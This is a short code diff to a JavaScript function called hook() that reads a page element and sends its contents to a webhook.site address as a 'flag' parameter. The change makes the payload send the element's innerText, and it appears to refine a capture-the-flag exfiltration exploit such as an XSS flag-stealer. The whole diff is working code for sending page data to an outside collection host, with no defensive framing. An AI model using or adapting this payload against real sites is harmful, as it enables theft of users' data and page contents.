@@ -11,7 +11,7 @@
         function hook() {
             var input = document.getElementById('input');
             var xhr = new XMLHttpRequest();
-            xhr.open('GET', `https://webhook.site/744508a6-a31e-46d4-a80b-bd0c6a71d253?flag=${input}`, true);
+            xhr.open('GET', `https://webhook.site/744508a6-a31e-46d4-a80b-bd0c6a71d253?flag=${input.innerText}`, true);
             xhr.setRequestHeader('Content-Type', 'application/json');
             xhr.send(JSON.stringify({data: input.value}));
         }
